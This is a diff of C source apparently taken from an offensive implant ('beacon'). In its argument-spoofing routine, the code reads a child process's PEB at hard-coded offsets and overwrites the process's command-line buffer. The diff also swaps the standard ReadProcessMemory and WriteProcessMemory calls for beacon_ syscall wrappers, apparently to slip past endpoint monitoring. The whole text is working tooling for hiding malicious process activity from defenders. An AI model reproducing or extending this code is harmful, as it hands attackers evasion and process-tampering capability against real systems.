@@ -6,6 +6,7 @@
 #include "parse.h"
 #include "argue.h"
 #include "process.h"
+#include "syscalls.h"
 
 BOOL execute_program_with_token(PROCESS_CONTEXT * ctx);
 
@@ -40,12 +41,12 @@ BOOL argue_restore(PROCESS_INFORMATION * pi, ARGUMENT_RECORD * record) {
 		return FALSE;
 	}
 
-	if (!ReadProcessMemory(pi->hProcess, (PCHAR)(ctx.Rdx) + 0x20, (LPVOID)&rtlUserProcParamsAddress, sizeof(LPVOID), NULL)) {
+	if (!beacon_ReadProcessMemory(pi->hProcess, (PCHAR)(ctx.Rdx) + 0x20, (LPVOID)&rtlUserProcParamsAddress, sizeof(LPVOID), NULL)) {
 		post_error_d(0x41, GetLastError());
 		return FALSE;
 	}
 
-	if (!ReadProcessMemory(pi->hProcess, (PCHAR)rtlUserProcParamsAddress + 0x70, &commandLine, sizeof(commandLine), NULL)) {
+	if (!beacon_ReadProcessMemory(pi->hProcess, (PCHAR)rtlUserProcParamsAddress + 0x70, &commandLine, sizeof(commandLine), NULL)) {
 		post_error_d(0x41, GetLastError());
 		return FALSE;
 	}
@@ -68,7 +69,7 @@ BOOL argue_restore(PROCESS_INFORMATION * pi, ARGUMENT_RECORD * record) {
 	}
 
 	/* push it! */
-	if (!WriteProcessMemory(pi->hProcess, commandLine.Buffer, (char *)commandLineContents, commandLine.MaximumLength, &wrote)) {
+	if (!beacon_WriteProcessMemory(pi->hProcess, commandLine.Buffer, (char *)commandLineContents, commandLine.MaximumLength, &wrote)) {
 		post_error_d(0x41, GetLastError());
 		memset((char *)commandLineContents, 0, commandLine.MaximumLength);
 		free(commandLineContents);
@@ -100,12 +101,12 @@ BOOL argue_restore(PROCESS_INFORMATION * pi, ARGUMENT_RECORD * record) {
 		return FALSE;
 	}
 
-	if (!ReadProcessMemory(pi->hProcess, (PCHAR)(ctx.Ebx) + 0x10, (LPVOID)&rtlUserProcParamsAddress, sizeof(LPVOID), NULL)) {
+	if (!beacon_ReadProcessMemory(pi->hProcess, (PCHAR)(ctx.Ebx) + 0x10, (LPVOID)&rtlUserProcParamsAddress, sizeof(LPVOID), NULL)) {
 		post_error_d(0x41, GetLastError());
 		return FALSE;
 	}
 
-	if (!ReadProcessMemory(pi->hProcess, (PCHAR)rtlUserProcParamsAddress + 0x40, &commandLine, sizeof(commandLine), NULL)) {
+	if (!beacon_ReadProcessMemory(pi->hProcess, (PCHAR)rtlUserProcParamsAddress + 0x40, &commandLine, sizeof(commandLine), NULL)) {
 		post_error_d(0x41, GetLastError());
 		return FALSE;
 	}
@@ -128,7 +129,7 @@ BOOL argue_restore(PROCESS_INFORMATION * pi, ARGUMENT_RECORD * record) {
 	}
 
 	/* push it! */
-	if (!WriteProcessMemory(pi->hProcess, commandLine.Buffer, (char *)commandLineContents, commandLine.MaximumLength, &wrote)) {
+	if (!beacon_WriteProcessMemory(pi->hProcess, commandLine.Buffer, (char *)commandLineContents, commandLine.MaximumLength, &wrote)) {
 		post_error_d(0x41, GetLastError());
 		memset((char *)commandLineContents, 0, commandLine.MaximumLength);
 		free(commandLineContents);
